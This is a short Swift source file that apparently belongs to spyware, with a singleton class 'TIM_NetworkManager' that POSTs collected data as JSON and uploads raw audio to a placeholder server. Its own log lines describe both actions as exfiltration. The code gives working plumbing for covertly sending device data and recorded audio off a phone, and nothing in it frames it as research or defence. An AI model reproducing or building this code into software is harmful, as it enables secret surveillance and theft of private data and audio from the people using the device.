import Foundation

class TIM_NetworkManager {
    static let shared = TIM_NetworkManager()
    private let backendURL = URL(string: "https://your-private-api.com/log")! // Or your Node.js backend URL

    private init() {}

    func send(_ data: [String: Any]) {
        var request = URLRequest(url: backendURL)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: data)
            URLSession.shared.dataTask(with: request).resume()
            print("TIM: Exfiltrated data successfully.")
        } catch {
            print("TIM: Error serializing exfiltration data.", error.localizedDescription)
        }
    }

    func uploadAudio(_ data: Data) {
        let uploadURL = URL(string: "https://your-private-api.com/upload/audio")!
        var request = URLRequest(url: uploadURL)
        request.httpMethod = "POST"
        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")
        request.httpBody = data
        
        URLSession.shared.dataTask(with: request).resume()
        print("TIM: Audio exfiltrated successfully.")
    }
}
